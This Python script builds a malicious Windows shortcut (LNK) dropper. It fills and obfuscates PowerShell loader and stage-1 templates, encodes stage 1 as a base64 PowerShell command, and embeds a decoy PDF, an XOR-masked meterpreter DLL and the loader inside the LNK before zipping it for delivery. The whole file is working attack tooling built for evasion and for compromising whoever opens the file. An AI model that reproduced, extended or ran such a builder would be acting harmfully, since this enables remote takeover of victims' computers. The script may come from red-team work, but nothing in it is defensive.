#!/bin/env python3

import base64
import subprocess

import evillnk
import PyFuscation

from append_file_with_enc import append_file, encode
from configs import *


def replace_placeholder(template, outfile, replacements):
	"""
	The loader script templates have placeholders that need to be replaced with file sizes of other files.
	This function performs that replacement on a single script template, and writes the contents to a new file.
	"""

	with open(template, 'r') as i:
		data = i.read()

	for rep in replacements:
		data = data.replace(rep, str(replacements[rep]))

	with open(outfile, 'w') as o:
		o.write(data) 


def perform_obfuscation(filename):
	"""
	PyFuscation is a third party resource that obfuscates function names, variables, and parameters in PowerShell scripts.
	This function calls that capability to obfuscate the loader scripts after the placeholder values have been replaced.
	"""
	obfuVAR = dict()
	obfuPARMS = dict()
	obfuFUNCs = dict()

	obfuVAR = PyFuscation.findVARs(filename)
	PyFuscation.useSED(obfuVAR, filename)

	obfuPARMS = PyFuscation.findCustomParams(filename, obfuVAR)
	PyFuscation.useSED(obfuPARMS, filename)

	obfuFUNCs = PyFuscation.findFUNCs(filename)
	PyFuscation.useSED(obfuFUNCs, filename)


def prepare_loader(pdf_filename, dll_filename, loader_template, loader_outfile):
	"""
	The loader script template contains placeholders for the PDF and DLL file sizes.
	This function obtains those file sizes, replaces the placeholders in the loader script, and then obfuscates it.
	pdf_length_placeholder and dll_length_placeholder are defined in configs.py.
	"""
	pdf_length = os.path.getsize(pdf_filename)
	dll_length = os.path.getsize(dll_filename)
	replacements = dict()
	replacements[pdf_length_placeholder] = pdf_length
	replacements[dll_length_placeholder] = dll_length
	replace_placeholder(loader_template, loader_outfile, replacements)
	perform_obfuscation(loader_outfile)


def prepare_stage1(loader_filename, stage1_template, stage1_outfile):
	"""
	The stage 1 script template contains a placeholder for the loader script file size.
	This function obtains the loader script file size, replaces the placeholder in the stage 1 script, and then obfuscates it.
	loader_length_placeholder is defined in configs.py.
	"""
	with open(loader_filename, 'rb') as in_file:
		data = in_file.read()
	loader_length = len(encode(data))

	replacements = dict()
	replacements[loader_length_placeholder] = loader_length
	replace_placeholder(stage1_template, stage1_outfile, replacements)
	perform_obfuscation(stage1_outfile)


def get_stage1_command(stage1_file):
	"""
	The format of a PowerShell encoded command is a base64 encoded UTF-16LE string.
	This function reads the stage 1 file (UTF-8) into a string, converts it into UTF-16LE encoding, and then base64 encodes that.
	In Python, Base64 conversion requires Bytes objects, so we decode the resulting Base64 encoded Bytes object into a UTF-8 string.
	"""
	with open(stage1_file, 'r') as in_file:
		data = in_file.read()

	data = data.encode('utf-16-le')
	data = base64.b64encode(data)
	data = data.decode('utf-8')
	return data


def create_zip(lnk_filename, zip_filename):
	subprocess.run(['rm', '-f', zip_filename])
	subprocess.run(['zip', zip_filename, lnk_filename])


def main():
	"""
	This function:
		- prepares the loader and stage 1 scripts
		- constructs the malicious LNK file, passing the stage 1 script as the encoded
			PowerShell command to execute
		- appropriately appends the dummy PDF, meterpreter DLL, and loader script to the LNK file
		- zips the resulting LNK file
	"""
	prepare_loader(pdf_filename, dll_filename, loader_template, loader_outfile)
	prepare_stage1(loader_outfile, stage1_template, stage1_outfile)
	stage1_command = get_stage1_command(stage1_outfile)
	arguments = argument_prefix + stage1_command

	evillnk.create_lnk(lnk_filename, target, arguments, icon, icon_index)

	append_file(pdf_filename, lnk_filename, to_encode=False, xor_key='a', seek=0x3000)
	append_file(dll_filename, lnk_filename, to_encode=False, xor_key='a', seek=0x30000)
	append_file(loader_outfile, lnk_filename, to_encode=True, xor_key=None, seek=0x5e2be)

	create_zip(lnk_filename, zip_filename)


if __name__ == '__main__':
	main()